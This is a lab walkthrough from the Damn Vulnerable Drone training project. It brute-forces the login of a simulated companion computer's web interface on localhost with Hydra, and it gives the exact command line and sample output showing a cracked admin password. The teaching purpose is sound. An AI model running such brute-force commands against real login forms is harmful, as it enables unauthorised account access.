<i>Executing password brute force attacks on the companion computer's web-based user interface using Hydra.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Companion Computer Web UI Login Brute Force

# Description

This scenario involves using Hydra, a popular brute-force tool, to crack the login credentials for the Companion Computer's Web UI located at <a href="http://localhost:3000">http://localhost:3000</a>. By following this guide, you will learn how to perform a password attack on a web-based interface and understand the principles of brute-forcing login forms via HTTP POST.

# Resources

- <a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>  
- <a href="https://github.com/nicholasaleks/Damn-Vulnerable-Drone/tree/master/simulator/mgmt/templates/pages/attacks/injection/passwords.txt">Damn Vulnerable Drone Password List</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install Hydra</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get install hydra
</code></pre>

Most Kali Linux images already include Hydra by default.

---

<h3>Step 2. Identify the Login Form</h3>
<p>Open <a href="http://localhost:3000">http://localhost:3000</a> in your browser. Use DevTools (right-click → Inspect → Network tab) to find:</p>

- The login form POST endpoint (e.g., <code>/login</code>)  
- The form field names (e.g., <code>username</code>, <code>password</code>)  
- The response string that indicates a failed login (e.g., "Invalid credentials")

---

<h3>Step 3. Prepare Your Wordlist</h3>

You can use the built-in password list from Damn Vulnerable Drone:

<pre><code class="code mb-3 mt-3">https://github.com/nicholasaleks/Damn-Vulnerable-Drone/tree/master/simulator/mgmt/templates/pages/attacks/injection/passwords.txt
</code></pre>

Download it or use your own custom wordlist.

---

<h3>Step 4. Run the Hydra Attack</h3>

Assuming the username is <code>admin</code> and the password list is named <code>passwords.txt</code>:

<pre><code class="code mb-3 mt-3">hydra -l admin -P passwords.txt http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid" -s 3000
</code></pre>

- <code>-l</code> sets the username  
- <code>-P</code> specifies the password list  
- <code>http-post-form</code> targets the login route  
- <code>:Invalid</code> tells Hydra what string indicates a failed login

---

<h3>Step 5. Review the Results</h3>

If successful, Hydra will display the cracked credentials:

<pre><code class="code mb-3 mt-3">[3000][http-post-form] host: localhost   login: admin   password: cyberdrone
</code></pre>

You can now log into the Companion Computer Web UI with the recovered credentials.

</details>
